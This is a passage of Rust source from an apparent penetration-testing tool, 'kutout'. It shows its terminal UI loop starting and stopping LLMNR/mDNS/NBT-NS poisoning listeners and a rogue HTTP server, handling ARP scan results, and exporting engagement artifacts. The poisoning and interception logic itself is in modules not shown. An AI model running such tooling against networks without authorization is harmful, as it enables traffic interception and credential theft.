                                responder_handles.push(std::thread::spawn(move || {
                                    if let Err(e) = attacks::rogue_http::run_rogue_http(
                                        bind,
                                        attacks::rogue_http::ROGUE_HTTP_PORT,
                                        t.clone(),
                                        s,
                                    ) {
                                        let _ = t.send(PentestEvent::error(format!(
                                            "rogue http: {}",
                                            e
                                        )));
                                    }
                                }));
                            }
                            responder_stop = Some(rstop);
                            app.responder_active = true;
                            let _ = sink.emit(&PentestEvent::info(
                                "responder listeners up (llmnr/mdns/nbt-ns/http)",
                            ));
                            app.status_message = "responder: on".into();
                        } else {
                            if let Some(s) = responder_stop.take() {
                                s.store(true, Ordering::Relaxed);
                            }
                            // let threads observe stop and exit; don't block on join here
                            let old_handles =
                                std::mem::take(&mut responder_handles);
                            std::thread::spawn(move || {
                                for h in old_handles {
                                    let _ = h.join();
                                }
                            });
                            app.responder_active = false;
                            let _ = sink.emit(&PentestEvent::info("responder stopped"));
                            app.status_message = "responder: off".into();
                        }
                    }
                    (KeyCode::Char('e'), _) => {
                        // export summary snapshot
                        match &out_dir {
                            Some(dir) => {
                                let snap = summary_state.lock().unwrap();
                                match snap.write_to_dir(dir) {
                                    Ok(()) => {
                                        app.status_message =
                                            format!("exported to {}", dir.display());
                                    }
                                    Err(e) => {
                                        app.status_message =
                                            format!("export failed: {}", e);
                                    }
                                }
                            }
                            None => {
                                app.status_message =
                                    "use --out-dir to enable export".into();
                            }
                        }
                    }
                    _ => {}
                }
              }
            }
        }

        // translate forwarding events → sink (raw frames dropped in live mode)
        while let Ok(evt) = event_rx.try_recv() {
            if let ForwardEvent::RawFrame { .. } = evt {
                continue;
            }
            if let Some(pe) = PentestEvent::from_forward(evt) {
                let _ = sink.emit(&pe);
            }
        }

        // responder events (llmnr/mdns/nbt-ns/rogue-http threads) → sink fanout
        while let Ok(pe) = responder_rx.try_recv() {
            let _ = sink.emit(&pe);
        }

        // drain sink channel → app
        while let Ok(pe) = pentest_rx.try_recv() {
            app.handle_event(&pe);
        }

        // scan results
        if let Ok(result) = scan_rx.try_recv() {
            scanning = false;
            match result {
                Ok(hosts) => {
                    let count = hosts.len();
                    for h in &hosts {
                        let _ = sink.emit(&PentestEvent::new(EventKind::HostDiscovered {
                            ip: h.ip,
                            mac: h.mac,
                        }));
                    }
                    app.hosts = hosts;
                    let _ = sink.emit(&PentestEvent::new(EventKind::ScanCompleted {
                        host_count: count,
                    }));
                    app.status_message = format!("{} hosts found", count);
                }
                Err(e) => {
                    let _ = sink.emit(&PentestEvent::error(format!("scan failed: {}", e)));
                    app.status_message = "scan failed".into();
                }
            }
        }

        if last_tick.elapsed() >= tick_rate {
            last_tick = Instant::now();
        }
    }

    let _ = sink.emit(&PentestEvent::new(EventKind::SessionEnded));
    // final drain so the ended event reaches the app before we tear the tui down
    while let Ok(pe) = pentest_rx.try_recv() {
        app.handle_event(&pe);
    }

    drop(_session);

    // dump summary artifacts on clean exit
    if let Some(dir) = &out_dir {
        let s = summary_state.lock().unwrap();
        match s.write_to_dir(dir) {
            Ok(()) => println!("engagement artifacts written to {}", dir.display()),
            Err(e) => eprintln!(
                "warning: could not write summary to {}: {}",
                dir.display(),
                e
            ),
        }
    }
    println!("kutout: session ended");

    Ok(())
}

// fast scan, short timeout
fn quick_scan(info: &iface::IfaceInfo) -> Result<Vec<arp::Host>> {
    let targets = iface::subnet_hosts(info.ip, info.netmask);
    let stop = Arc::new(AtomicBool::new(false));
    arp::scan(info, &targets, Duration::from_secs(2), stop)
}

// ip -> mac via cache or arp
fn resolve_mac(info: &iface::IfaceInfo, ip: Ipv4Addr) -> Result<[u8; 6]> {
    if let Some(mac) = iface::lookup_arp_cache(ip) {
        return Ok(mac);
    }

    let (mut tx, mut rx) = arp::open_channel(&info.iface)?;
    let frame = arp::build_arp_frame(
        info.mac,
        [0xff; 6],
        info.mac,
        info.ip,
        [0x00; 6],
        ip,
        false,
    );
    arp::send_arp_frame(tx.as_mut(), &frame)?;

    let deadline = Instant::now() + Duration::from_secs(3);
    while Instant::now() < deadline {
        match rx.next() {
            Ok(data) => {
                let eth = pnet_packet::ethernet::EthernetPacket::new(data);
                if let Some(eth) = eth {
                    if eth.get_ethertype() == pnet_packet::ethernet::EtherTypes::Arp {
                        if let Some(arp_pkt) = pnet_packet::arp::ArpPacket::new(eth.payload()) {
                            if arp_pkt.get_sender_proto_addr() == ip {
                                return Ok(arp_pkt.get_sender_hw_addr().octets());
                            }
                        }
                    }
                }
            }
            Err(_) => continue,
        }
    }

    Err(anyhow!("could not resolve mac for {}", ip))
}

// ctrl-c
fn ctrlc_handler(stop: Arc<AtomicBool>) {
    let _ = ctrlc::set_handler(move || {
        stop.store(true, Ordering::Relaxed);
    });
}
